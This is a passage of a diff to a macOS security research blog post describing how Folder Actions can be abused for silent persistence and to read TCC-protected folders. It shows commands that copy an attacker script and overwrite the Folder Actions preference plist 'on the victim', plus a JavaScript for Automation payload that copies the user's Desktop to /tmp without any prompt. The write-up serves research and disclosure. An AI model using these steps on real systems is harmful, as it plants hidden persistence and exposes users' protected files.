+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>5<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>name<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>11<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
+</span></span><span style="display:flex;"><span>		Ym9vaywEAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>		AAAAHAMAAAQAAAADAwAAAAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGNz
+</span></span><span style="display:flex;"><span>		YWJ5AAAABwAAAAEBAABMaWJyYXJ5AAcAAAABAQAAU2NyaXB0cwAVAAAAAQEA
+</span></span><span style="display:flex;"><span>		AEZvbGRlciBBY3Rpb24gU2NyaXB0cwAAABEAAAABAQAAZm9sZGVyYWN0aW9u
+</span></span><span style="display:flex;"><span>		LnNjcHQAAAAYAAAAAQYAABAAAAAgAAAAMAAAAEAAAABQAAAAcAAAAAgAAAAE
+</span></span><span style="display:flex;"><span>		AwAAQ10AAAMAAAAIAAAABAMAAE2ZAAADAAAACAAAAAQDAABVmQAAAwAAAAgA
+</span></span><span style="display:flex;"><span>		AAAEAwAAnx0GAAMAAAAIAAAABAMAAKAdBgADAAAACAAAAAQDAACtHQYAAwAA
+</span></span><span style="display:flex;"><span>		ABgAAAABBgAArAAAALwAAADMAAAA3AAAAOwAAAD8AAAACAAAAAAEAABBw6vO
+</span></span><span style="display:flex;"><span>		IggBaBgAAAABAgAAAQAAAAAAAAAPAAAAAAAAAAAAAAAAAAAACAAAAAQDAAAE
+</span></span><span style="display:flex;"><span>		AAAAAAAAAAQAAAADAwAA9QEAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1h
+</span></span><span style="display:flex;"><span>		Y2ludG9zaCBIRAgAAAAEAwAAAJAvUAkAAAAIAAAAAAQAAEHDjpDvAAAAJAAA
+</span></span><span style="display:flex;"><span>		AAEBAAAwQTgxRjNCMS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAA
+</span></span><span style="display:flex;"><span>		AQIAAIEAAAABAAAA7xMAAAEAAAAAAAAAAAAAAAEAAAABAQAALwAAAAAAAAAB
+</span></span><span style="display:flex;"><span>		BQAA9gAAAAECAAAwOTRiZDU2MmIwZTAyYWQ2ZDk4ODdhNjdhZGRhMDRjNGU3
+</span></span><span style="display:flex;"><span>		ODRlZWI0ZmJhYTUyOGRjMDQzZjhhNTQ4ZTc1MDQyOzAwOzAwMDAwMDAwOzAw
+</span></span><span style="display:flex;"><span>		MDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwMDAwMDAwMjA7Y29tLmFwcGxlLmFw
+</span></span><span style="display:flex;"><span>		cC1zYW5kYm94LnJlYWQtd3JpdGU7MDE7MDEwMDAwMDY7MDAwMDAwMDMwMDA2
+</span></span><span style="display:flex;"><span>		MWRhZDswMTsvdXNlcnMvY3NhYnkvbGlicmFyeS9zY3JpcHRzL2ZvbGRlciBh
+</span></span><span style="display:flex;"><span>		Y3Rpb24gc2NyaXB0cy9mb2xkZXJhY3Rpb24uc2NwdAAAANgAAAD+////AQAA
+</span></span><span style="display:flex;"><span>		AAAAAAARAAAABBAAAIwAAAAAAAAABRAAAAwBAAAAAAAAEBAAADwBAAAAAAAA
+</span></span><span style="display:flex;"><span>		QBAAACwBAAAAAAAAAiAAAAgCAAAAAAAABSAAAHgBAAAAAAAAECAAAIgBAAAA
+</span></span><span style="display:flex;"><span>		AAAAESAAALwBAAAAAAAAEiAAAJwBAAAAAAAAEyAAAKwBAAAAAAAAICAAAOgB
+</span></span><span style="display:flex;"><span>		AAAAAAAAMCAAABQCAAAAAAAAAcAAAFwBAAAAAAAAEcAAACAAAAAAAAAAEsAA
+</span></span><span style="display:flex;"><span>		AGwBAAAAAAAAENAAAAQAAAAAAAAAgPAAABwCAAAAAAAA
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>folderaction.scpt<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalScript<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalScript<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalFolderAction<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalFolderAction<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$top<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;key&gt;</span>root<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>1<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$version<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>100000<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
+</span></span></code></pre></div><p>More embedded data! :( If we decode the new base64 strings, we will again get a binary plist. Unfortunately <code>plutil</code> can&rsquo;t convert it, and throws an error but if we take a look it will contain further info about the folders we set and the script.</p>
 <p>I didn&rsquo;t want to fully reverse the structure of this plist, but simply take a shortcut. We can setup a folder action script on our machine, like the above and take it to the victim.</p>
 <p>Taking the above plist we can overwrite the one on the machine. There is zero protection on the file, so we can freely do that.</p>
 <p>So the manual setup is to copy our script to its location, create the folder we want to watch (if it doesn&rsquo;t exists), and overwrite preferences.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">csaby@mantarey ~ % mkdir -p <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts&#34;</span>
-csaby@mantarey ~ % cp folderaction.scpt <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts/&#34;</span> 
-csaby@mantarey ~ % mkdir <span style="color:#366">test</span>
-csaby@mantarey ~ % cp com.apple.FolderActionsDispatcher.plist Library/Preferences 
-</code></pre></div><p>We could also do something like this to edit the preferences file:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">defaults write <span style="color:#c30">&#34;com.apple.FolderActionsDispatcher&#34;</span> <span style="color:#c30">&#34;folderActions&#34;</span> <span style="color:#c30">&#39;&#34;{length = 2513, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 00000935 }&#34;&#39;</span>
-</code></pre></div><p>In this case, for the example, our folder action script does the following:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#069;font-weight:bold">var</span> app <span style="color:#555">=</span> Application.currentApplication();
-app.includeStandardAdditions <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">true</span>;
-app.doShellScript(<span style="color:#c30">&#34;touch /tmp/folderaction.txt&#34;</span>);
-app.doShellScript(<span style="color:#c30">&#34;touch ~/Desktop/folderaction.txt&#34;</span>);
-app.doShellScript(<span style="color:#c30">&#34;cp -R ~/Desktop /tmp/&#34;</span>);
-</code></pre></div><p>Now if we do anything in the folder&hellip;. nothing happens. :(</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mantarey ~ % mkdir -p <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts&#34;</span>
+</span></span><span style="display:flex;"><span>csaby@mantarey ~ % cp folderaction.scpt <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts/&#34;</span> 
+</span></span><span style="display:flex;"><span>csaby@mantarey ~ % mkdir <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>csaby@mantarey ~ % cp com.apple.FolderActionsDispatcher.plist Library/Preferences 
+</span></span></code></pre></div><p>We could also do something like this to edit the preferences file:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>defaults write <span style="color:#c30">&#34;com.apple.FolderActionsDispatcher&#34;</span> <span style="color:#c30">&#34;folderActions&#34;</span> <span style="color:#c30">&#39;&#34;{length = 2513, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 00000935 }&#34;&#39;</span>
+</span></span></code></pre></div><p>In this case, for the example, our folder action script does the following:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> app <span style="color:#555">=</span> Application.currentApplication();
+</span></span><span style="display:flex;"><span>app.includeStandardAdditions <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>app.doShellScript(<span style="color:#c30">&#34;touch /tmp/folderaction.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>app.doShellScript(<span style="color:#c30">&#34;touch ~/Desktop/folderaction.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>app.doShellScript(<span style="color:#c30">&#34;cp -R ~/Desktop /tmp/&#34;</span>);
+</span></span></code></pre></div><p>Now if we do anything in the folder&hellip;. nothing happens. :(</p>
 <p>There is one more thing we need to do. The preference file has to be consumed, and for that we need to start the <code>Folder Action Setup.app</code> utility, which we can kill after.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">csaby@mantarey ~ % open <span style="color:#c30">&#34;/System/Library/CoreServices/Applications/Folder Actions Setup.app/&#34;</span>                                 
-csaby@mantarey ~ % killall <span style="color:#c30">&#34;Folder Actions Setup&#34;</span>
-</code></pre></div><p>Now if we do anything with it in Finder, the script will be triggered. All of this without any user prompt.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mantarey ~ % open <span style="color:#c30">&#34;/System/Library/CoreServices/Applications/Folder Actions Setup.app/&#34;</span>                                 
+</span></span><span style="display:flex;"><span>csaby@mantarey ~ % killall <span style="color:#c30">&#34;Folder Actions Setup&#34;</span>
+</span></span></code></pre></div><p>Now if we do anything with it in Finder, the script will be triggered. All of this without any user prompt.</p>
 <p>Someone can either prepare a PLIST file upfront as I did here, or reverse it and programmatically do it. I didn&rsquo;t do that, but if anyone does I would be interested seeing that :)</p>
 <h2 id="tcc-implication">TCC implication</h2>
 <p>As you might have noticed, I made a command to copy all files from the <code>~/Desktop</code> into <code>/tmp/</code>. As <code>Desktop</code> is protected by TCC it&rsquo;s interesting to observe what happens. The script is not executed by Finder but  <code>FolderActionDispatcher</code>.</p>
